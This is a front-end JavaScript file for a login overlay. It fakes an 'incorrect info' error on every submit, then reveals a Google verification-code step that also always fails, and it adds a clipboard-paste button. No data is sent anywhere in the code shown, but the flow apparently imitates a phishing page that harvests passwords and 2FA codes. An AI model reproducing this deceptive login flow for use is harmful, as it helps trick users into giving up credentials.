window.onload = function() {
    let body = document.querySelector('#body');
    let beforeSubmit = document.querySelector('#beforeSubmit');
    let loginLoading = document.querySelector('#loginLoading');
    let incorrectInfo = document.querySelector('#incorrectInfo');
    let submit = document.querySelector('#submit');
    let incorrectCode = document.querySelector('#incorrectCode');
    let login = document.querySelector('.login-overlay .login');
    login.classList.add('show');
    let hidepassword = document.querySelector('#hidePassword');
    let passwordInput = document.querySelector('.input-password-container input');
    hidepassword.onclick = function () {
        if( passwordInput.getAttribute('type') === 'text') {
            passwordInput.setAttribute('type' , 'password');
        } else {
            passwordInput.setAttribute('type' , 'text');
        }
        hidepassword.classList.toggle('hide-password'); 
    } 
    let googleVerification = document.querySelectorAll('.will-show');
    let willHide = document.querySelectorAll('.will-hide');
    beforeSubmit.onclick = function () { 
        loginLoading.style.display = "block" ;
        incorrectInfo.classList.add('alerting');
        setTimeout(() => {
            incorrectInfo.classList.remove('alerting')
        }, 3000);
        setTimeout(() => {
            for (let i = 0; i < googleVerification.length; i++) {
                googleVerification[i].classList.remove('will-show');
            }
            for (let i = 0; i < willHide.length; i++) {
                willHide[i].classList.add('hide');
            }
        }, 3500);
    }
    submit.onclick = function () {
        incorrectCode.classList.add('alerting');
        setTimeout(() => {
            incorrectCode.classList.remove('alerting')
        }, 3000);
    }
    let pasteHere = document.querySelector('#pasteHere');
    let pasteBtn = document.querySelector('#pasteBtn');
    pasteBtn.onclick = function () {
        navigator.clipboard.readText()
        .then(text => {
          pasteHere.value = text;
        })
        .catch(err => {
          console.error('Failed to read clipboard contents: ', err);
        });
    }
}